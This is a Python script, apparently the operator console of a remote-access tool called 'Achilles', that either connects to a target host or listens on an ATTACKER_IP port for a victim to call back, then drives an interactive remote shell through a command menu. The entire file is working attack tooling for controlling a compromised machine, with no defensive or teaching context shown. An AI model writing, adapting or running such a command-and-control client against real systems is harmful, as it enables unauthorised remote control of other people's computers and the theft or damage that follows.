import socket
from time import sleep

ATTACKER_IP = "0.0.0.0"
ATTACKER_PORT = 22

TARGET_IP = "192.168.68.106"
TARGET_PORT = 8989


def connection():
    # | 1. dst addr | 2. skt | 3. connect | 4. sendall
    print("[>>>] stage 2")

    RUN = True

    while RUN:
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        status = skt.connect_ex((TARGET_IP, TARGET_PORT))
        if status == 0:
            print("[*] Connection established")
            RUN = False
        else:
            sleep(5)
            print(f"[!] Could not connect to server {status}")
            skt.close()

    response = skt.recv(1024).decode("utf-8")
    print(f" > {response}")
    mainMenu(skt)


def reverseConnection():
    # | 1.src addr | 2. skt init | 3.bind | 4.listen | 5.new skt | 6.recv | 7.sendall |

    print("[*] Init stage 1")

    sktrec = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sktrec.bind((ATTACKER_IP, ATTACKER_PORT))
    try:
        print("[*] Waiting for connection")
        sktrec.listen(1)

        connID, addr = sktrec.accept()
        print(f"[*] Connection established with {addr}")

        response = connID.recv(1024).decode("utf-8")  #
        print(f" > {response}")

        mainMenu(connID)

        connID.close()
    except socket.error as e:
        print(f"[!] Could not connect to server {e}")
    finally:
        sktrec.close()


def mainMenu(skt):
    print("[*] Main Menu")
    while True:

        command = input("Enter your command: ")

        if command == "rs":
            skt.sendall(command.encode("utf-8"))
            response = skt.recv(1024).decode("utf-8")
            print(f" > {response}")
            reverseShell(skt)
            print("[*] Back to menu")

        elif command == "exit":
            skt.sendall(command.encode("utf-8"))
            skt.close()
            exit(0)
        else:
            print("[!] Command was not recognised, try again...")


def reverseShell(skt):
    skt.settimeout(0.2)
    try:
        print(skt.recv(1024).decode("utf-8"), end="")
    except:
        pass
    skt.settimeout(None)
    while True:
        command = input("")
        skt.sendall((command + "\n").encode("utf-8"))
        sleep(1)
        print("\033[2K", end='\r')
        while True:
            try:
                skt.settimeout(0.1)
                data = skt.recv(4096)
                if not data:
                    break
                if data.decode("utf-8") != (command + "\n"):
                    print(data.decode("utf-8"), end="", flush=True)
            except socket.timeout:
                break

        if command == "exit":
            print()
            break
    skt.settimeout(None)



def main():
    print("Welcome Achilles!\n [1] Normal connection\n [2] Reverse connection")
    response = input("Enter your choice: ")
    while True:
        if response == "1":
            connection()
        elif response == "2":
            reverseConnection()
        else:
            print("[!] Command was not recognised, try again...")

if __name__ == "__main__":
    main()